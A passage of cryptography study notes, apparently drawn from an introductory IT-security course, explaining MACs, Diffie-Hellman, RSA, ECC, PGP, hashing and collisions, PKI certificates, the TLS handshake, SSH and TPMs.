> or cipher. What this means, is that the symmetric encryption key or
> shared secret is transmitted securely to the other party using
> asymmetric encryption to keep the shared secret secure in transit.
> Once the shared secret is received, data can be sent quickly, and
> efficiently, and securely using a symmetric encryption cipher. Clever?
> One last topic to mention is somewhat related to asymmetric encryption
> and that\'s MACs or **Message Authentication Codes**, not to be
> confused with media access control or MAC addresses.
>
> A **MAC** is a bit of information that allows authentication of a
> received message, ensuring that the message came from the alleged
> sender and not a third party masquerading as them. It also ensures
> that the message wasn\'t modified in some way in order to provide data
> integrity. This sounds super similar to digital signatures using
> public key cryptography, doesn\'t it? While very similar, it differs
> slightly since the secret key that\'s used to generate the MAC is the
> same one that\'s used to verify it. In this sense, it\'s similar to
> symmetric encryption system and the secret key must be agreed upon by
> all communicating parties beforehand or shared in some secure way.
> This describes one popular and secure type of MAC called HMAC or a
> Keyed-Hash Message Authentication Code. HMAC uses a cryptographic hash
> function along with a secret key to generate a MAC. Any cryptographic
> hash functions can be used like Sha-1 or MD5 and the strength or
> security of the MAC is dependent upon the underlying security of the
> cryptographic hash function used. The MAC is sent alongside the
> message that\'s being checked. The Mac is verified by the receiver by
> performing the same operation on the received message, then comparing
> the computed MAC with the one received with the message. If the MACs
> are the same, then the message is authenticated. There are also MACs
> based on symmetric encryption ciphers, either block or stream like DES
> or AES, which are called CMACs or Cipher-Based Message Authentication
> Codes. The process is similar to HMAC, but instead of using a hashing
> function to produce a digest, a symmetric cipher with a shared keys
> used to encrypt the message and the resulting output is used as the
> MAC. A specific and popular example of a CMAC though slightly
> different is CBC-MAC or Cipher Block Chaining Message Authentication
> Codes. CBC-MAC is a mechanism for building MACs using block ciphers.
> This works by taking a message and encrypting it using a block cipher
> operating in CBC mode. CBC mode is an operating mode for block ciphers
> that incorporates a previously encrypted block cipher text into the
> next block\'s plain text. So, it builds a chain of encrypted blocks
> that require the full, unmodified chain to decrypt. This chain of
> interdependently encrypted blocks means that any modification to the
> plain text will result in a different final output at the end of the
> chain, ensuring message integrity. In the next section, we\'ll check
> out some common examples of asymmetric encryption algorithms and
> systems. I\'ll see you there.

#####  How to break encryption

Many modern encryption algorithms have been battle tested (sometimes for
decades) with no known vulnerabilities. This, however, does not mean
that such encryption cannot be broken.

Breaking encryption with no known flaws is a bit like guessing a
password. If you guess enough times, you will eventually get it right.
However, with strong encryption, this can take a long time.

For example, very few modern laptops have an Rmax processing benchmark
higher than 1 teraFLOP. The most powerful (known) supercomputer in the
world is currently Fugaku, which has a Rmax peak speed of 442 petaFLOPS,
with 1 petaFLOP = 1000 teraFLOPS.

Dedicating its entire output to the task, it would take Fugaku over 12
trillion years to exhaust all possible combinations for AES-128. AES-256
is 340 billion-billion-billion-billion times harder to brute force than
AES-128. To put this into perspective, the universe is 14 billion years
old.

However, there are adversaries with significantly more computing power
than one laptop (or even supercomputer). Some government agencies have
access to hundreds of thousands of servers that could bring breaking
weaker encryption into the realm of possibility.

Quantum computing will eventually pose new challenges to secure
encryption, which is a subject we will discuss in an upcoming post.

#### Asymmetric Algorithms

##### Diffie-Hellman

Earlier, we talked about how asymmetric systems are commonly used as key
exchange mechanisms to establish a shared secret that will be used with
symmetric cipher. Another popular key exchange algorithm is DH or
Diffie-Hellman named for the co-inventors. Let\'s walk through how the
DH key exchange algorithm works. Let\'s assume we have two people who
would like to communicate over an unsecured channel, and let\'s call
them Suzanne and Daryll. I\'ve grown pretty fond of these two. First,
Suzanne and Daryl agree on the starting number that would be random and
will be very large integer. This number should be different for every
session and doesn\'t need to be secret. Next, each person chooses
another randomized large number but this one is kept secret. Then, they
combine their shared number with their respective secret number and send
the resulting mix to each other. Next, each person combines their secret
number with the combined value they received from the previous step. The
result is a new value that\'s the same on both sides without disclosing
enough information to any potential eavesdroppers to figure out the
shared secret. This algorithm was designed solely for key exchange,
though there have been efforts to adapt it for encryption purposes.
It\'s even been used as part of a PKI system or **Public Key
Infrastructure** system. We\'ll dive more into PKI systems later in this
course.

##### RSA

So, one of the first practical asymmetric cryptography systems to be
developed is RSA, name for the initials of the three co-inventors. Ron
Rivest, Adi Shamir and Leonard Adleman. This crypto system was patented
in 1983 and was released to the public domain by RSA Security in the
year 2000. The RSA system specifies mechanisms for generation and
distribution of keys along with encryption and decryption operation
using these keys. We won\'t go into the details of the math involved,
since it\'s pretty high-level stuff and beyond the scope of this class.
But, it\'s important to know that the key generation process depends on
choosing two unique, random, and usually very large prime numbers. DSA
or Digital Signature Algorithm is another example of an asymmetric
encryption system, though its used for signing and verifying data. It
was patented in 1991 and is part of the US government\'s Federal
Information Processing Standard. Similar to RSA, the specification
covers the key generation process along with the signing and verifying
data using the key pairs. It\'s important to call out that the security
of this system is dependent on choosing a random seed value that\'s
incorporated into the signing process. If this value was leaked or if it
can be inferred if the prime number isn\'t truly random, then it\'s
possible for an attacker to recover the private key. This actually
happened in 2010 to Sony with their PlayStation 3 game console. It turns
out they weren\'t ensuring this randomized value was changed for every
signature. This resulted in a hacker group called failOverflow being
able to recover the private key that Sony used to sign software for
their platform. This allowed moders to write and sign custom software
that was allowed to run on the otherwise very locked down console
platform. This resulted in game piracy becoming a problem for Sony, as
this facilitated the illicit copying and distribution of games which
caused significant losses in sales. I\'ve included links to more about
this in the next reading, in case you want to dive deeper.

*Summary*

RSA is named for the MIT scientists (Rivest, Shamir, and Adleman) who
first described it in 1977. It is an asymmetric algorithm that uses a
publicly known key for encryption, but requires a different key, known
only to the intended recipient, for decryption. In this system,
appropriately called public key cryptography (PKC), the public key is
the product of multiplying two huge prime numbers together. Only that
product, 1024, 2048, or 4096 bits in length, is made public. But RSA
decryption requires knowledge of the two prime factors of that product.
Because there is no known method of calculating the prime factors of
such large numbers, only the creator of the public key can also generate
the private key required for decryption.

RSA is more computationally intensive than AES, and much slower. It's
normally used to encrypt only small amounts of data.

##### Elliptic curve cryptography

**Elliptic curve cryptography** or ECC is a public key encryption system
that uses the algebraic structure of elliptic curves over finite fields
to generate secure keys. What does that even mean? Well, traditional
public key systems, make use of factoring large prime numbers whereas
ECC makes use of elliptic curves. And elliptic curve is composed of a
set of coordinates that fit in equation, similar to something like Y to
the second equals X to the third, plus A X plus B. Elliptic curves have
a couple of interesting and unique properties. One is horizontal
symmetry, which means that at any point in the curve can be mirrored
along the x axis and still make up the same curve. On top of this, any
non-vertical line will intersect the curve in three places at most. Its
this last property that allows elliptic curves to be used in encryption.
The benefit of elliptic curve based encryption systems is that they are
able to achieve security similar to traditional public key systems with
smaller key sizes. So, for example, a 256 bit elliptic curve key, would
be comparable to a 3,072 bit RSA key. This is really beneficial since it
reduces the amount of data needed to be stored and transmitted when
dealing with keys. Both Diffie-Hellman and DSA have elliptic curve
variants, referred to as ECDH and ECDSA, respectively. The US NEST
recommends the use of EC encryption, and the NSA allows its use to
protect up the top secret data with 384 bit EC keys. But, the NSA has
expressed concern about EC encryption being potentially vulnerable to
quantum computing attacks, as quantum computing technology continues to
evolve and mature. I\'m going to buy Suzanne and Darryl drink today for
all their hard work. In the meantime, we\'ve cooked up an assignment for
you that will test your encryption and decryption skills. Take your time
to decode all the details, and I\'ll see you all in the next lesson.

Very common for mobile/low-power computing devices.

ECC is six times more efficient than RSA. ECC with 256-bit key is
equivalent to RSA with a 2048-bit key.

##### PGP 

**PGP** stands for **Pretty Good Privacy**. How\'s that for a creative
name? Well, PGP is an encryption application that allows authentication
of data along with privacy from third parties relying upon asymmetric
encryption to achieve this. It\'s most commonly used for encrypted email
communication, but it\'s also available as a full disk encryption
solution or for encrypting arbitrary files, documents, or folders. PGP
was developed by Phil Zimmerman in 1991 and it was freely available for
anyone to use. The source code was even distributed along with the
software. Zimmerman was an anti nuclear activist, and political activism
drove his development of the PGP encryption software to facilitate
secure communications for other activists. PGP took off once released
and found its way around the world, which wound up getting Zimmerman
into hot water with the US federal government. At the time, US federal
export regulations classified encryption technology that used keys
larger than 40 bits in length as munitions. This meant that PGP was
subject to similar restrictions as rockets, bombs, firearms, even
nuclear weapons. PGP was designed to use keys no smaller than 128-bit,
so it ran up against these export restrictions, and Zimmerman faced a
federal investigation for the widespread distribution of his
cryptographic software. Zimmerman took a creative approach to
challenging these restrictions by publishing the source code in a
hardcover printed book which was made available widely. The idea was
that the contents of the book should be protected by the first amendment
of the US constitution. Pretty clever? The investigation was eventually
closed in 1996 without any charges being filed, and Zimmerman didn\'t
even need to go to court. You can read more about why he developed PGP
in the next reading. PGP is widely regarded as very secure, with no
known mechanisms to break the encryption via cryptographic or
computational means. It\'s been compared to military grade encryption,
and there are numerous cases of police and government unable to recover
data protected by PGP encryption. In these cases, law enforcement tend
to resort to legal measure to force the handover of passwords or keys.
Originally, PGP used the RSA algorithm, but that was eventually replaced
with DSA to avoid issues with licensing.

<https://www.philzimmermann.com/EN/essays/WhyIWrotePGP.html>

PGP gave rise to the OpenPGP standard:
<https://www.openpgp.org/about/standard/>

A JavaScript Library: <https://openpgpjs.org/>

Also served as the catalyst for secure email services which adhere to
the OpenPGP standard to encrypt email and OpenPGP.js to secure data on
the client-side (front-end). These include CTemplar and Protonmail.

AES vs PGP: Which should I use?

-   AES is fast and works best in closed systems and large databases

-   PGP should be used when sharing information across an open network,
    but it can be slower and works better for individual files.

### How AES and RSA work together (public and private)

A major issue with AES is that, as a symmetric algorithm, it requires
that both the encryptor and the decryptor use the same key. This gives
rise to a crucial key management issue -- how can that all-important
secret key be distributed to perhaps hundreds of recipients around the
world without running a huge risk of it being carelessly or deliberately
compromised somewhere along the way? The answer is to combine the
strengths of AES and RSA encryption.

In many modern communication environments, including the internet, the
bulk of the data exchanged is encrypted by the speedy AES algorithm. To
get the secret key required to decrypt that data, authorized recipients
publish a public key while retaining an associated private key that only
they know. The sender then uses that public key and RSA to encrypt and
transmit to each recipient their own secret AES key, which can be used
to decrypt the data.

## Hashing

![Graphical user interface, text, application Description automatically
generated](media/image8.png){width="6.5in"
height="2.4631944444444445in"}

![Graphical user interface, text, application, chat or text message
Description automatically generated](media/image9.png){width="6.5in"
height="1.5506944444444444in"}

![Text Description automatically
generated](media/image10.png){width="6.5in"
height="3.009027777777778in"}

![Graphical user interface, text, application Description automatically
generated](media/image11.png){width="6.5in"
height="2.1069444444444443in"}

So far, we\'ve talked about two forms of encryption, symmetric and
asymmetric. In this next lesson, we\'re going to cover a special type of
function that\'s widely used in computing and especially within
security, hashing. No, not the breakfast kind, although those are
delicious. Hashing or a hash function is a type of function or operation
that takes in an arbitrary data input and maps it to an output of a
fixed size, called a hash or a digest. The output size is usually
specified in bits of data and is often included in the hashing function
name. What this means exactly is that you feed in any amount of data
into a hash function and the resulting output will always be the same
size. But the output should be unique to the input, such that two
different inputs should never yield the same output. Hash functions have
a large number of applications in computing in general, typically used
to uniquely identify data. You may have heard the term hash table before
in context of software engineering. This is a type of data structure
that uses hashes to accelerate data lookups. Hashing can also be used to
identify duplicate data sets in databases or archives to speed up
searching of tables or to remove duplicate data to save space. Depending
on the application, there are various properties that may be desired,
and a variety of hashing functions exist for various applications.
We\'re primarily concerned with cryptographic hash functions which are
used for various applications like authentication, message integrity,
fingerprinting, data corruption detection and digital signatures.
Cryptographic hashing is distinctly different from encryption because
cryptographic hash functions should be one directional. They\'re similar
in that you can input plain text into the hash function and get output
that\'s unintelligible but you can\'t take the hash output and recover
the plain text. The

*ideal cryptographic hash function should be*

-   **deterministic**, meaning that the same input value should always
    return the same hash value.

-   The function should be **quick to compute and be efficient**. It
    should be infeasible to reverse the function and recover the plain
    text from the hash digest. A small change in the input should result
    in a change in the output so that there is no correlation between
    the change in the input and the resulting change in the output.

-   Finally, the function **should not allow for hash collisions**,
    meaning two different inputs mapping to the same output.

> Cryptographic hash functions are very similar to symmetric key block
> ciphers and that they operate on blocks of data. In fact, many popular
> hash functions are actually based on modified block ciphers. Lets take
> a basic example to quickly demonstrate how a hash function works.
> We\'ll use an imaginary hash function for demonstration purposes. Lets
> say we have an input string of \"Hello World\" and we feed this into a
> hash function which generates the resulting hash of E49A00FF. Every
> time we feed this string into our function, we get the same hash
> digest output. Now let\'s modify the input very slightly so it becomes
> \"hello world\", all lower case now. While this change seems small to
> us, the resulting hash output is wildly different, FF1832AE. Here is
> the same example but using a real hash function, in this case md5sum.
>
> ![Text Description automatically
> generated](media/image12.png){width="6.5in"
> height="2.276388888888889in"}

**Hashing Algorithms**

NTLM creates a 128-bit fixed output.

MD-5 creates a 128-bit fixed output.

SHA-1 creates a 160-bit fixed output.

SHA-2 creates a 256-bit fixed output.

**What\'s a hash collision?**

A hash collision is when 2 different inputs give the same output. Hash
functions are designed to avoid this as best as they can, especially
being able to engineer (create intentionally) a collision. Due to the
pigeonhole effect, collisions are not avoidable. The pigeonhole effect
is basically, there are a set number of different output values for the
hash function, but you can give it any size input. As there are more
inputs than outputs, some of the inputs must give the same output. If
you have 128 pigeons and 96 pigeonholes, some of the pigeons are going
to have to share.

MD5 and SHA1 have been attacked, and made technically insecure due to
engineering hash collisions. However, no attack has yet given a
collision in both algorithms at the same time so if you use the MD5 hash
AND the SHA1 hash to compare, you will see they're different. The MD5
collision example is available
from <https://www.mscs.dal.ca/~selinger/md5collision/> and details of
the SHA1 Collision are available from <https://shattered.io/>. Due to
these, you shouldn\'t trust either algorithm for hashing passwords or
data.

### MD5

In this section, we\'ll cover some of the more popular hashing
functions, both currently and historically. MD5 is a popular and widely
used hash function designed in the early 1990s as a cryptographic
hashing function. It operates on a 512 bit blocks and generates 128 bit
hash digests. While MD5 was published in 1992, a design flaw was
discovered in 1996, and cryptographers recommended using the SHA-1 hash,
a more secure alternative. But, this flaw was not deemed critical, so
the hash function continued to see widespread use and adoption. In 2004,
it was discovered that MD5 is susceptible to hash collisions, allowing
for a bad actor to craft a malicious file that can generate the same MD5
digest as another different legitimate file. Bad actors are the worst,
aren\'t they? Shortly after this flaw was discovered, security
researchers were able to generate two different files that have matching
MD5 hash digests. In 2008, security researchers took this a step further
and demonstrated the ability to create a fake SSL certificate, that
validated due to an empty five hash collision. Due to these very serious
vulnerabilities in the hash function, it was recommended to stop using
MD5 for cryptographic applications by 2010. In 2012, this hash collision
was used for nefarious purposes in the flame malware, which used the
forge Microsoft digital certificate to sign their malware, which
resulted in the malware appearing to be from legitimate software that
came from Microsoft. You can learn more about the flame malware in the
next reading.

### SHA-1

When design flaws were discovered in MD5, it was recommended to use
SHA-1 as a replacement. SHA-1 is part of the secure hash algorithm suite
of functions, designed by the NSA and published in 1995. It operates a
512 bit blocks and generates 160 bit hash digest. SHA-1 is another
widely used cryptographic hashing functions, used in popular protocols
like TLS/SSL, PGP SSH, and IPsec. SHA-1 is also used in version control
systems like Git, which uses hashes to identify revisions and ensure
data integrity by detecting corruption or tampering. SHA-1 and SHA-2
were required for use in some US government cases for protection of
sensitive information. Although, the US National Institute of Standards
and Technology, recommended stopping the use of SHA-1 and relying on
SHA-2 in 2010. Many other organizations have also recommended replacing
SHA-1 with SHA-2 or SHA-3. And major browser vendors have announced
intentions to drop support for SSL certificates that use SHA-1 in 2017.
SHA-1 also has its share of weaknesses and vulnerabilities, with
security researchers trying to demonstrate realistic hash collisions.
During the 2000s, a bunch of theoretical attacks were formulated and
some partial collisions were demonstrated, but full collisions using
these methods requires significant computing power. One such attack was
estimated to require \$2.77 million in cloud computing CPU resources,
Wowza. In 2015, a different attack method was developed that didn\'t
demonstrate a full collision but this was the first time that one of
these attacks was demonstrated which had major implications for the
future security of SHA-1. What was only theoretically possible before,
was now becoming possible with more efficient attack methods and
increases in computing performance, especially in the space of GPU
accelerated computations in cloud resources. A full collision with this
attack method was estimated to be feasible using CPU and GPU cloud
computing for approximately \$75 to \$120,000 , much cheaper than
previous attacks. You can read more about these attacks and collisions
in the next reading. In early 2017, the first full collision of SHA-1
was published. Using significant CPU and GPU resources, two unique PDF
files were created that result in the same SHA-1 hash. The estimated
processing power required to do this was described as equivalent of
6,500 years of a single CPU, and 110 years of a single GPU computing
non-stop. That\'s a lot of years.

### SHA-2

SHA-2 is actually a "family" of hashes and comes in a variety of
lengths, the most popular being 256-bit.

The variety of SHA-2 hashes can lead to a bit of confusion, as websites
and authors express them differently. If you see "SHA-2," "SHA-256" or
"SHA-256 bit," those names are referring to the same thing. If you see
"SHA-224," "SHA-384," or "SHA-512," those are referring to the alternate
bit-lengths of SHA-2. You may also see some sites being more explicit
and writing out both the algorithm and bit-length, such as "SHA-2 384."
But that's obnoxious like making people include your middle initial when
you say your name.

### MIC (message integrity check)

There\'s also the concept of a **MIC**, or **message integrity check**.
This shouldn\'t be confused with a MAC or message authentication check,
since how they work and what they protect against is different. A MIC is
essentially a hash digest of the message in question. You can think of
it as a check sum for the message, ensuring that the contents of the
message weren\'t modified in transit. But this is distinctly different
from a MAC that we talked about earlier. It doesn\'t use secret keys,
which means the message isn\'t authenticated. There\'s nothing stopping
an attacker from altering the message, recomputing the checksum, and
modifying the MIC attached to the message. You can think of MICs as
protecting against accidental corruption or loss, but not protecting
against tampering or malicious actions.

![Graphical user interface, text, application, email Description
automatically generated](media/image13.png){width="6.5in"
height="3.2868055555555555in"}

During the 2000s, a bunch of [theoretical
attacks](https://eprint.iacr.org/2005/010) against SHA1 were
[formulated](https://www.schneier.com/blog/archives/2005/02/sha1_broken.html)
and some [partial collisions](https://eprint.iacr.org/2007/474) were
demonstrated. In early 2017, the first [full collision of
SHA1](https://shattered.io/) was published.

## Cryptography Applications

### Digital certificates and Public Key Infrastructure

![Graphical user interface, application, Teams Description automatically
generated](media/image14.png){width="6.5in"
height="4.593055555555556in"}

In this lesson, we\'re going to cover PKI, or Public Key Infrastructure.
Spoiler alert, this is a critical piece to securing communications on
the Internet today. Earlier we talked about Public Key Cryptography and
how it can be used to securely transmit data over an untrusted channel
and verify the identity of a sender using digital signatures.

**PKI** is a system that defines the creation, storage and distribution
of digital certificates. A digital certificate is a file that proves
that an entity owns a certain public key. A certificate contains
information about the public key, the entity it belongs to and a digital
signature from another party that has verified this information. If the
signature is valid and we trust the entity that signed the certificate,
then we can trust the public key to be used to securely communicate with
the entity that owns it. The entity that\'s responsible for storing,
issuing, and signing certificates is referred to as **CA**, or
**Certificate Authority**. It\'s a crucial component of the PKI system.

A **certificate authority (CA)** is a server that issues digital
certificates for entities and maintains the associated private/public
key pair. 

There\'s also an **RA**, or **Registration Authority**, that\'s
responsible for verifying the identities of any entities requesting
certificates to be signed and stored with the CA. This role is usually
lumped together with the CA. A central repository is needed to securely
store and index keys and a certificate management system of some sort
makes managing access to storage certificates and issuance of
certificates easier.

[There are a few different types of certificates that have different
applications or uses.]{.underline}

-   The one you\'re probably most familiar with is **SSL or TLS *server*
    certificate**. This is a certificate that a web server presents to a
    client as part of the initial secure setup of an SSL, TLS
    connection. Don\'t worry, we\'ll cover SSL, TLS in more detail in a
    future lesson. The client usually a web browser will then verify
    that the subject of the certificate matches the host name of the
    server the client is trying to connect to. The client will also
    verify that the certificate is signed by a certificate authority
    that the client trusts.

    -   It\'s possible for a certificate to be valid for multiple host
        names. In some cases, a **wild card certificate** can be issued
        where the host name is replaced with an asterisk, denoting
        validity for all host names within a domain.

-   It\'s also possible for a server to use what\'s called a **Self Sign
    Certificate**. You may have guessed from the name. This certificate
    has been signed by the same entity that issued the certificate. This
    would basically be signing your own public key using your private
    key. Unless you already trusted this key, this certificate would
    fail to verify.

-   **Another certificate type is an SSL or TLS *client* certificate**.
    This is an optional component of SSL, TLS connections and is less
    commonly seen than server certificates. As the name implies, these
    are certificates that are bound to clients and are used to
    authenticate the client to the server, allowing access control to a
    SSL, TLS service. These are different from server certificates in
    that the client certificates aren\'t issued by a public CA. Usually
    the service operator would have their own internal CA which issues
    and manages client certificates for their service.

-   There are also **code signing certificates** which are used for
    signing executable programs. This allows users of these signed
    applications to verify the signatures and ensure that the
    application was not tampered with. It also lets them verify that the
    application came from the software author and is not a malicious
    twin.

> We\'ve mentioned certificate authority trust, but not really explained
> it. So let\'s take some time to go over how it all works. PKI is very
> much dependent on trust relationships between entities, and building a
> network or chain of trust. This chain of trust has to start somewhere
> and that starts with the Root Certificate Authority. These root
> certificates are self signed because they are the start of the chain
> of trust. So there\'s no higher authority that can sign on their
> behalf. This Root Certificate Authority can now use the self-signed
> certificate and the associated private key to begin signing other
> public keys and issuing certificates. It builds a sort of tree
> structure with the root private key at the top of the structure. If
> the root CA signs a certificate and sets a field in the certificate
> called CA to true, this marks a certificate as an intermediary or
> subordinate CA. What this means is that the entity that this
> certificate was issued to can now sign other certificates. And this CA
> has the same trust as the root CA. An intermediary CA can also sign
> other intermediate CAs. You can see how this extension of trust from
> one root CA to intermediaries can begin to build a chain. A
> certificate that has no authority as a CA is referred to as an End
> Entity or Leaf Certificate. Similar to a leaf on a tree, it\'s the end
> of the tree structure and can be considered the opposite of the roots.
> You might be wondering how these root CAs wind up being trusted in the
> first place. Well, that\'s a very good question. In order to bootstrap
> this chain of trust, you have to trust a root CA certificate,
> otherwise the whole chain is untrusted. This is done by distributing
> root CA certificates via alternative channels. Each major OS vendor
> ships a large number of trusted root CA certificates with their OS.
> And they typically have their own programs to facilitate distribution
> of root CA certificates. Most browsers will then utilize the OS
> provided store of root certificates. Let\'s do a deep dive into
> certificates beyond just their function.
>
> ![Graphical user interface, text, application, chat or text message
> Description automatically
> generated](media/image15.png){width="4.07768372703412in"
> height="1.8719881889763779in"}
>
> **The X.509 standard** is what defines the format of digital
> certificates. It also defines a certificate revocation list or CRL
> which is a means to distribute a list of certificates that are no
> longer valid. The X.509 standard was first issued in 1988 and the
> current modern version of the standard is version 3.
>
> The fields defined in X.509 certificate are, the

-   version, what version of the X.509 standard certificate adheres to.

-   Serial number, a unique identifier for their certificate assigned by
    the CA which allows the CA to manage and identify individual
    certificates.

-   Certificate Signature Algorithm, this field indicates what public
    key algorithm is used for the public key and what hashing algorithm
    is used to sign the certificate.

-   Issuer Name, this field contains information about the authority
    that signed the certificate.

-   Validity, this contains two subfields, Not Before and Not After,
    which define the dates when the certificate is valid for.

-   Subject, this field contains identifying information about the
    entity the certificate was issued to.

-   Subject Public Key Info, these two subfields define the algorithm of
    the public key along with the public key itself.

-   Certificate signature algorithm, same as the Subject Public Key Info
    field, these two fields must match.

-   Certificate Signature Value, the digital signature data itself.

-   There are also certificate fingerprints which aren\'t actually
    fields in the certificate itself, but are computed by clients when
    validating or inspecting certificates. These are just hash digests
    of the whole certificate. You can read about the full X.509 standard
    in the next reading.

> ![Graphical user interface, text, application, chat or text message
> Description automatically
> generated](media/image16.png){width="4.94884186351706in"
> height="2.3316655730533684in"}
>
> An alternative to the centralized PKI model of establishing trust and
> binding identities is what\'s called the Web of Trust. A Web of Trust
> is where individuals instead of certificate authorities sign other
> individuals\' public keys. Before an individual signs a key, they
> should first verify the person\'s identity through an agreed upon
> mechanism. Usually by checking some form of identification, driver\'s
> license, passport, etc. Once they determine the person is who they
> claim to be, signing their public key is basically vouching for this
> person. You\'re saying that you trust that this public key belongs to
> this individual. This process would be reciprocal, meaning both
> parties would sign each other\'s keys. Usually people who are
> interested in establishing web of trust will organize what are called
> Key Signing Parties where participants performed the same verification
> and signing. At the end of the party everyone\'s public key should
> have been signed by every other participant establishing a web of
> trust. In the future when one of these participants in the initial key
> signing party establishes trust with a new member, the web of trust
> extends to include this new member and other individuals they also
> trust. This allows separate webs of trust to be bridged by individuals
> and allows the network of trust to grow.
>
> ![Timeline Description automatically generated with low
> confidence](media/image17.png){width="6.5in"
> height="3.6215277777777777in"}

**Digital Signature**

Digital Signature = Hashed data + Private Key

Digital signatures are used for sender authentication and message
integrity. Digital signatures are created by hashing the data being sent
and encrypting it with their developer\'s or sender\'s private key.
Private keys are maintained securely by an individual or device and used
to decrypt messages that are encrypted by their public key. Private keys
are also used to create digital signatures by encrypting a hash of the
sent data.

**Louis, a software developer at Dion Training, created a hash value for
a software package and then encrypted this hash value using Dion
Training\'s private key. Which of the following terms is used to
describe this encrypted hash value?**

*Digital signature*

### SSL, and TLS: Cryptography in action

SSL/TLS does use symmetric encryption algorithms for encryption of data
payloads. It also uses asymmetric algorithms to securely exchange
information to establish a shared symmetric encryption key.

In this section, we\'ll dive into some real world applications of the
encryption concepts that we\'ve covered so far. In the last section, we
mentioned SSL/TLS when we were talking about digital certificates. Now
that we understand how digital certificates function and the crucial
roles CAs play, let\'s check out how that fits into securing web traffic
via HTTPS. You\'ve probably heard of HTTPS before, but do you know
exactly what it is and how it\'s different from HTTP? Very simply, HTTPS
is the secure version of HTTP, the Hypertext Transfer Protocol. So how
exactly does HTTPS protect us on the Internet? HTTPS can also be called
HTTP over SSL or TLS since it\'s essentially encapsulating the HTTP
traffic over an encrypted, secured channel utilizing SSL or TLS. You
might hear SSL and TLS used interchangeably, but SSL 3.0, the latest
revision of SSL, was deprecated in 2015, and TLS 1.2 is the current
recommended revision, with version 1.3 still in the works. Now, it\'s
important to call out that TLS is actually independent of HTTPS, and is
actually a generic protocol to permit secure communications and
authentication over a network. TLS is also used to secure other
communications aside from web browsing, like VoIP calls such as Skype or
Hangouts, email, instant messaging, and even Wi-Fi network security.

**TLS grants us three things.**

1.  One, a secure communication line, which means data being transmitted
    is protected from potential eavesdroppers.

2.  Two, the ability to authenticate both parties communicating, though
    typically, only the server is authenticated by the client.

3.  And three, the integrity of communications, meaning there are checks
    to ensure that messages aren\'t lost or altered in transit.

**TLS handshake**

TLS essentially provides a secure channel for an application to
communicate with a service, but there must be a mechanism to establish
this channel initially. This is what\'s referred to as a **TLS
handshake**.

![A picture containing diagram Description automatically
generated](media/image18.png){width="6.5in" height="3.84375in"}

The handshake process kicks off with a client establishing a connection
with a TLS enabled service, referred to in the protocol as ClientHello.
This includes information about the client, like the version of the TLS
that the client supports, a list of cipher suites that it supports, and
maybe some additional TLS options. The server then responds with a
ServerHello message, in which it selects the highest protocol version in
common with the client, and chooses a cipher suite from the list to use.
It also transmits its digital certificate and a final ServerHelloDone
message. The client will then validate the certificate that the server
sent over to ensure that it\'s trusted and it\'s for the appropriate
host name. Assuming the certificate checks out, the client then sends a
ClientKeyExchange message. This is when the client chooses a key
exchange mechanism to securely establish a shared secret with the
server, which will be used with a symmetric encryption cipher to encrypt
all further communications. The client also sends a ChangeCipherSpec
message indicating that it\'s switching to secure communications now
that it has all the information needed to begin communicating over the
secure channel. This is followed by an encrypted Finished message which
also serves to verify that the handshake completed successfully.

The server replies with a ChangeCipherSpec and an encrypted Finished
message once the shared secret is received. Once complete, application
data can begin to flow over the now the secured channel. High five to
that.

**The session key** is the shared symmetric encryption key using TLS
sessions to encrypt data being sent back and forth. Since this key is
derived from the public-private key, if the private key is compromised,
there\'s potential for an attacker to decode all previously transmitted
messages that were encoded using keys derived from this private key.

To defend against this, there\'s a concept of forward secrecy. This is a
property of a cryptographic system so that even in the event that the
private key is compromised, the session keys are still safe. The SSH, or
secure shell, is a secure network protocol that uses encryption to allow
access to a network service over unsecured networks. Most commonly,
you\'ll see SSH use for remote login to command line base systems, but
the protocol is super flexible and has provisions for allowing arbitrary
networks and traffic over those ports to be tunneled over the encrypted
channel. It was originally designed as a secure replacement for the
Telnet protocol and other unsecured remote login shell protocols like
rlogin or r-exec. It\'s very important that remote login and shell
protocols use encryption. Otherwise, these services will be transmitting
usernames and passwords, along with keystrokes and terminal output in
plain text. This opens up the possibility for an eavesdropper to
intercept credentials and keystrokes, not good. SSH uses public key
cryptography to authenticate the remote machine that the client is
connecting to, and has provisions to allow user authentication via
client certificates, if desired. The SSH protocol is very flexible and
modular, and supports a wide variety of different key exchange
mechanisms like Diffie-Hellman, along with a variety of symmetric
encryption ciphers. It also supports a variety of authentication
methods, including custom ones that you can write. **[When using public
key authentication, a key pair is generated by the user who wants to
authenticate. They then must distribute those public keys to all systems
that they want to authenticate to using the key pair. When
authenticating, SSH will ensure that the public key being presented
matches the private key, which should never leave the user\'s
possession.]{.underline}**

*Public keys are cryptographically tied to private keys!!!*

![Text Description automatically
generated](media/image19.png){width="4.685634295713036in"
height="3.8401181102362205in"}

![Text Description automatically
generated](media/image20.png){width="4.173054461942257in"
height="3.588112423447069in"}

### Cryptographic Hardware

**Trusted Platform Module**

Welcome back. Let\'s dive right in. Another interesting application of
cryptography concepts, is the Trusted Platform Module or TPM. This is a
hardware device that\'s typically integrated into the hardware of a
computer, that\'s a dedicated crypto processor. TPM offers secure
generation of keys, random number generation, remote attestation, and
data binding and sealing. A TPM has unique secret RSA key burned into
the hardware at the time of manufacture, which allows a TPM to perform
things like hardware authentication. This can detect unauthorized
hardware changes to a system. Remote attestation is the idea of a system
authenticating its software and hardware configuration to a remote
system. This enables the remote system to determine the integrity of the
remote system. This can be done using a TPM by generating a secure hash
of the system configuration, using the unique RSA key embedded in the
TPM itself. Another use of this secret hardware backed encryption key is
data binding and sealing. It involves using the secret key to derive a
unique key that\'s then used for encryption of data. Basically, this
binds encrypted data to the TPM and by extension, the system the TPM is
installed in, sends only the keys stored in hardware in the TPM will be
able to decrypt the data. Data sealing is similar to binding since data
is encrypted using the hardware backed encryption key. But, in order for
the data to be decrypted, the TPM must be in a specified state. TPM is a
standard with several revisions that can be implemented as a discrete
hardware chip, integrated into another chip in a system, implemented in
firmware software or virtualize then a hypervisor. The most secure
implementation is the discrete chip, since these chip packages also
incorporate physical tamper resistance to prevent physical attacks on
the chip. Mobile devices have something similar referred to as a secure
element. Similar to a TPM, it\'s a tamper resistant chip often embedded
in the microprocessor or integrated into the mainboard of a mobile
device. It supplies secure storage of cryptographic keys and provides a
secure environment for applications. An evolution of secure elements is
the Trusted Execution Environment or TEE which takes the concept a bit
further. It provides a full-blown isolated execution environment that
runs alongside the main OS. This provides isolation of the applications
from the main OS and other applications installed there. It also
isolates secure processes from each other when running in the TEE. TPMs
have received criticism around trusting the manufacturer. Since the
secret key is burned into the hardware at the time of manufacture, the
